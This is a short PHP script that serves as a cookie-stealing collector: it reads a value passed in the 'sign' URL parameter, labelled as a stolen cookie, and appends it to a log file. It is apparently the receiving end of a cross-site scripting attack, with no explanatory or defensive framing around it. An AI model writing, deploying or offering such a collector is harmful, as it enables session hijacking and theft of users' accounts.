<?php
    $cookie = $_GET["sign"];
    $steal = fopen("log.txt", "a+");
    fwrite($steal, $cookie . "\n");
    fclose($steal);
?>
